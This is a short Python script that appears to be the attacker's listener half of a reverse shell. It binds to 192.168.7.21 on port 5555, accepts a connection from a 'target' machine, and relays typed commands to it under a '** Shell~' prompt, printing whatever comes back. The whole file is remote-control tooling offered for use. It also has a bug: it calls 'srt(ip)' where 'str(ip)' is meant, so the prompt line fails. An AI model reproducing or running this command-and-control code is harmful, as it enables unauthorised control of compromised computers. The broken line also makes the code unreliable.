import socket
import json


def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_rcv():
	data=''
	while True:
		try:
			data += target.recv(1024).decode().rstrip()
			return json.loads(data) 
		except ValueError:
			continue
			
def target_communication():
	while True:
		cmd = input('** Shell~%s: '%srt(ip))
		reliable_send(cmd)
		if cmd == 'quit':
			break
		else:
			result = reliable_rcv()
			print(result)


socc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socc.bind(('192.168.7.21', 5555))
print('[+] Listening For Incoming Connections')
socc.listen(5)

target , ip = socc.accept()
print(f'[+] Connection From {str(ip)} Is Successfull :)')
target_communication()
